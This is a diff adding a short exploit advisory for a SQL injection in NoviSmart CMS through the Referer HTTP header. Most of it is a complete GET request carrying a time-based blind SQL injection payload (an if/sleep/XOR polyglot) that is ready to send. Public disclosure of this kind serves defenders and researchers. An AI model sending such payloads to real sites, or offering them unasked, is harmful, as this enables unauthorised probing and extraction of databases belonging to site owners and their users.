@@ -1,0 +1,26 @@
+# Exploit Title: NoviSmart CMS SQL injection
+# Date: 23.7.2019.
+# Exploit Author: n1x_ [MS-WEB]
+# Vendor Homepage: http://www.novismart.com/
+# Version: Every version
+# CVE : CWE-89
+
+Vulnerable parameter: Referer (HTTP Header field)
+
+[GET Request]
+
+GET / HTTP/1.1
+Referer: if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Client-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: localhost
+Accept-Language: en
+Via: 1.1 wa.www.test.com
+Origin: http://www.test.com/
+X-Requested-With: XMLHttpRequest
+Cookie: PHPSESSID=24769012200df6ccd9002dbf5b978e9c; language=1
+Host: host
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+Accept: */*
